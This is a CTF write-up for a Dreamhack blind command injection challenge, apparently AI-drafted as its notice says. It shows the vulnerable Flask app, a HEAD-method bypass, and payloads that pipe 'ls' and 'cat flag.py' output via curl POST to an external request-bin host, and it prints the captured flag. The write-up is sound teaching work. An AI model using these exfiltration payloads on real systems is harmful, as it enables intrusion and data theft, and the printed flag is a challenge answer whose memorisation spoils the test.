---
title: "드림핵 blind-command"
date: 2026-01-17
categories:
  - CTF
tags:
  - web, CTF
---

# Dreamhack CTF Write-up: Blind Command Injection

**Date:** 2026-01-20  
**Category:** Web Hacking  
**Exploit Type:** Blind Command Injection, Method Override
**NOTICE:** 이글은 테스트 목적으로 AI로 작성하였습니다.

## 1. Problem Analysis

The challenge provides a web service that takes a `cmd` parameter via URL.
Upon accessing the page, it simply displays the input value.

### Source Code Analysis (`app.py`)

The core logic of the provided `app.py` is as follows:

```python
#!/usr/bin/env python3
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/' , methods=['GET'])
def index():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return "?cmd=[cmd]"

    if request.method == 'GET':
        ''
    else:
        os.system(cmd)
    return cmd

app.run(host='0.0.0.0', port=8000)
```

### Vulnerability Identification

1.  **Restricted Method Check**: The code explicitly checks `if request.method == 'GET':`. If true, it does nothing (`''`).
2.  **Dangerous `else` Block**: If the method is *not* `GET`, it executes `os.system(cmd)`.
3.  **Flask Behavior**: By default, when `methods=['GET']` is defined in Flask, **HEAD** requests are implicitly allowed.
    *   When a `HEAD` request is sent, `request.method` becomes `'HEAD'`.
    *   This bypasses the `if` condition and triggers the `else` block.
4.  **Blind Execution**: `os.system()` executes the command on the server shell but sends the output to the server's standard output (console), *not* the HTTP response. Therefore, we cannot see the result on the webpage directly.

## 2. Exploit Strategy

Since we cannot see the output of our commands (Blind Command Injection), we need an **Out-of-Band (OOB)** data exfiltration technique. We will force the server to send the command output to an external server we control.

**Tools Used:**
*   **Web Browser / DevTools**: To send requests.
*   **Dreamhack Tools (Request Bin)**: To receive the exfiltrated data.
*   **`curl`**: Used within the payload to send data out.

### Step 1: Verify Remote Code Execution (RCE)

First, we verify if commands are actually executing using a time-based approach.

*   **Payload:** `/?cmd=sleep 2`
*   **Method:** `HEAD`

Sending this request resulted in a response delay, confirming that the command was executed.

### Step 2: Prepare Request Bin

We created a Request Bin URL to receive the data:
*   **Endpoint:** `https://cycomis.request.dreamhack.games`

### Step 3: Exfiltrate File List

We need to know what files exist in the current directory. We pipe the output of `ls` to `curl`.

*   **Command:** `ls | curl -X POST --data-binary @- https://cycomis.request.dreamhack.games`
*   **URL Encoded Payload:** `http://host3.dreamhack.games:19190/?cmd=ls%20%7C%20curl%20-X%20POST%20--data-binary%20%40-%20https%3A%2F%2Fcycomis.request.dreamhack.games`
*   **HTTP Method:** `HEAD`

**Result (from Request Bin):**
```text
app.py flag.py requirements.txt
```
We found `flag.py`.

### Step 4: Exfiltrate Flag

Now we read the content of `flag.py` and send it to our Request Bin.

*   **Command:** `cat flag.py | curl -X POST --data-binary @- https://cycomis.request.dreamhack.games`
*   **HTTP Method:** `HEAD`

**Result (from Request Bin):**
```python
FLAG = 'DH{4c9905b5abb9c3eb10af4ab7e1645c23}'
```

## 3. Conclusion

The vulnerability existed because the developer assumed only `GET` requests would reach the endpoint and failed to account for implicit method handling in the framework (Flask).

**The Flag:**
`DH{4c9905b5abb9c3eb10af4ab7e1645c23}`
